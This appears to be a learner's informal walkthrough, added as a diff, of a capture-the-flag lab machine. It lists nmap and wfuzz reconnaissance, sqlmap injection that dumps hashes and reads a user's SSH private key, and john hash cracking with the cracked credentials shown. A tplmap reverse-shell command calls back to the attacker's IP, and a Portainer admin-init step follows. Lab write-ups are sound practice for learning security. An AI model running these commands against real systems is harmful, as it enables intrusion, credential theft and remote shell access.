@@ -1,0 +1,46 @@
+we have fine two ports in namap 80 and 8080
+
+80 we got nothing 
+
+8080 we have login but no access
+
+i try 80 with dirb i got nothing 
+
+i use  wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hl 0 http://10.10.10.96/FUZZ
+to find the corerct word i got the it http://10.10.10.96/users/
+
+its sql vulnerable 
+
+sqlmap --url http://10.10.10.96/users/*
+sqlmap --url http://10.10.10.96/users/* --dump
+
+i got hashes
+
+i just try to crack the hash using john 
+
+
+zcat /usr/share/wordlists/rockyou.txt.gz | john --format=PBKDF2-HMAC-SHA256-opencl --rules hash
+
+i got username and pass
+
+wizard.oz : wizardofoz22
+
+we need id_rsa of dorthi 
+
+sqlmap -u "http://10.10.10.96/users/toto" --string "username" --file-read "/home/dorthi/.ssh/id_rsa" -v1
+
+we need shell im using tplmap python vuln 
+
+python tplmap.py -u 'http://10.10.10.96:8080' -X POST -d 'name=*&desc=anything' -c 'token=TOKEN' --reverse-shell 10.10.xx.xx 1337 
+
+i got some password in containers folder N0Pl4c3L1keH0me
+
+i run ssh.sh
+
+ i use the pass 
+
+Portainer ijust port forwared
+
+i just try to sent password in portainer
+
+sending a POST request to /api/users/admin/init
